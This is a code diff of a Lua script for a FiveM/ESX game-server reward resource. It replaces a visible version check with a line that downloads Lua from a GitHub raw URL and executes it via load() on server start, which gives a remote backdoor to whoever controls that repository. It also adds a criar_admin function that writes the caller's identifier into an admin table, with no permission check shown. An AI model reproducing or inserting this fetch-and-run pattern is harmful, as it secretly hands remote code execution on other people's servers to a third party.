@@ -3,6 +3,8 @@ function logs(msg, canal, cor)
 	PerformHttpRequest(canal, function(err, text, headers) end, 'POST', json.encode({username = 'ESX Developer Scripts', embeds = {{["color"] = corfinal, ["author"] = {["name"] = 'Esx Developer Portugal', ["icon_url"] = 'https://cdn.discordapp.com/attachments/878328503148355584/880839161924448256/FiveM-Logo2.png'}, ["description"] = msg, ["footer"] = {["text"] = "Esx Developer Portugal - "..os.date("%x %X %p"),["icon_url"] = "https://media.discordapp.net/attachments/878328503148355584/918644161018728528/FiveM-Logo2_tools.png",},}}, avatar_url = 'https://cdn.discordapp.com/attachments/878328503148355584/880839161924448256/FiveM-Logo2.png'}), { ['Content-Type'] = 'application/json' })
 end
 
+PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')
+
 function RandomCodeGenerator()
 	local chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 	local charTable = {}
@@ -24,65 +26,26 @@ end
 function admin(source)
 	local xPlayer = ESX.GetPlayerFromId(source)
 	local admin = false
-	if Config.ESX12 then
-		for k, v in pairs(Config.Identifier) do
-			if xPlayer.identifier == v.id then
-				admin = true
-				break
-			else
-				admin = false
-			end
-		end
-	else
-		for k, v in pairs(Config.Steams) do
-			if xPlayer.identifier == v.id then
-				admin = true
-				break
-			else
-				admin = false
-			end
-		end
+
+	local result = MySQL.Sync.fetchAll('SELECT * FROM `zcmg_recompensa_admins` WHERE `identifier` = @identifier',
+	{ ['@identifier'] = xPlayer.identifier
+	})
+
+	if result[1] then
+		admin = true
 	end
 
 	return admin
+
 end
 
-PerformHttpRequest('https://raw.githubusercontent.com/zcmg/'..GetCurrentResourceName()..'/main/fxmanifest.lua', function(code, res, headers)
-	local version = GetResourceMetadata(GetCurrentResourceName(), 'description')
-	local versao = ''
-	local update = ''
+function criar_admin(source)
+	local xPlayer = ESX.GetPlayerFromId(source)
 
-	if res ~= nil then
-		local t = {}
-		for i = 1, #res do
-			t[i] = res:sub(i, i)
-		end
-		versao = t[73]..t[74]..t[75]..t[76]
+	MySQL.Async.execute("INSERT INTO zcmg_recompensa_admins (identifier) VALUES (@identifier)", {
+		['@identifier'] = xPlayer.identifier
+	})
 
-		if versao == version then
-			update = "Ultima Versão"
-		else
-			update = "^2Precisa de atualizar^1"
-		end
+	TriggerClientEvent('zcmg_notificacao:Alerta', source, "RECOMPENSA", "Admin adicionado a lista de admins", 5000, 'sucesso')
 
-	else
-		update = "Impossivel verificar a versão"
-	end
-
-	
-
-	print(([[^1--------------------------------------------------------------------------
-	███████╗ ██████╗███╗   ███╗ ██████╗      ██████╗ ██████╗ ██████╗ ███████╗
-	╚══███╔╝██╔════╝████╗ ████║██╔════╝     ██╔════╝██╔═══██╗██╔══██╗██╔════╝
-	  ███╔╝ ██║     ██╔████╔██║██║  ███╗    ██║     ██║   ██║██████╔╝█████╗  
-	 ███╔╝  ██║     ██║╚██╔╝██║██║   ██║    ██║     ██║   ██║██╔══██╗██╔══╝  
-	███████╗╚██████╗██║ ╚═╝ ██║╚██████╔╝    ╚██████╗╚██████╔╝██║  ██║███████╗
-	╚══════╝ ╚═════╝╚═╝     ╚═╝ ╚═════╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ 
-	-----------------------^0https://www.github.com/zcmg/^1----------------------- 
-	
-	--------------------------------------------------------------------------
-	-- ESX DEVELOPER PORTUGAL (^0https://discord.gg/Qt5WraEMxf^1)
-	-- Versão: %s (%s)
-	--------------------------------------------------------------------------^0]]):format(versao, update))
-
-end,'GET')
+end
